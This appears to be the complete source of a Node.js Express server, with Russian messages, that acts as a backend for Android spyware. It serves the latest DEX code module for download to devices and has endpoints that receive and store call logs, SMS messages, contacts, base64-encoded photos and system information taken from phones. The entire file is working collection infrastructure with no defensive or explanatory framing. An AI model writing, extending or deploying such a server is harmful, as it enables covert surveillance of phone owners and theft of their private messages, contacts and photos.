const { Console } = require('console');
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb' }));

const dexStorage = './dex_modules';
if (!fs.existsSync(dexStorage)) fs.mkdirSync(dexStorage);

app.get('/get-latest-dex', (req, res) => {
  console.log("/get-latest-dex")
  fs.readdir(dexStorage, (err, files) => {
    if (err || files.length === 0) return res.status(404).send('DEX не найден');
    const latestDex = files.sort().reverse()[0];
    res.sendFile(path.resolve(dexStorage, latestDex));
  });
});

app.post('/upload-calls', (req, res) => {
  console.log("/upload-calls")
  const callLog = req.body;
  if (!callLog || !Array.isArray(callLog)) return res.status(400).send('Неверный формат данных')
  const logFile = './call_logs.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'Журнал звонков сохранен' });
  });
});

app.post('/upload-sms', (req, res) => {
  console.log("/upload-sms")
  const callLog = req.body;
  const logFile = './sms.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'SMS сохранены' });
  });
});

app.post('/upload-contacts', (req, res) => {
  console.log("/upload-contacts")
  const callLog = req.body;
  const logFile = './contacts.json';
  fs.appendFile(logFile, JSON.stringify(callLog, null, 2) + ',\n', err => {
    if (err) return res.status(500).send('Ошибка при сохранении данных');
    res.json({ message: 'Контакты сохранены' });
  });
});

app.post('/upload-photos', (req, res) => {
  const photosData = req.body;

  const metaPath = path.join(__dirname, 'uploads', 'photos_meta.json');
  fs.appendFileSync(metaPath, JSON.stringify(photosData) + '\n');

  photosData.forEach((photo, index) => {
    if (photo.base64) {
      const buffer = Buffer.from(photo.base64, 'base64');
      const filename = `photo_${Date.now()}_${index}.jpg`;
      fs.writeFileSync(path.join(__dirname, 'uploads', filename), buffer);
    }
  });

  res.status(200).send('Photos received');
});

app.post('/upload-system-info', (req, res) => {
  const systemInfo = req.body;

  const logEntry = {
    timestamp: new Date().toISOString(),
    data: systemInfo
  };

  fs.appendFileSync(
    path.join(__dirname, 'system_logs.json'),
    JSON.stringify(logEntry) + '\n'
  );

  res.status(200).json({
    status: 'success',
    receivedData: Object.keys(systemInfo)
  });
});

app.listen(PORT, () => {
  console.log(`Сервер запущен на http://localhost:${PORT}`);
});
